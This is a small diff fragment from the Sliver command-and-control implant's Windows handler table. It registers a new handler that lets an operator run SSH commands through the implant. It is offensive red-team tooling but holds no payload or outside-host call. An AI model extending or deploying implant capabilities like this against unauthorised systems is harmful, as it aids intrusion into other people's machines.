+++ implant/sliver/handlers/handlers_windows.go
@@ -86,6 +86,7 @@ var (
 		sliverpb.MsgExecuteReq:           executeHandler,
 		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
 		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
+		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
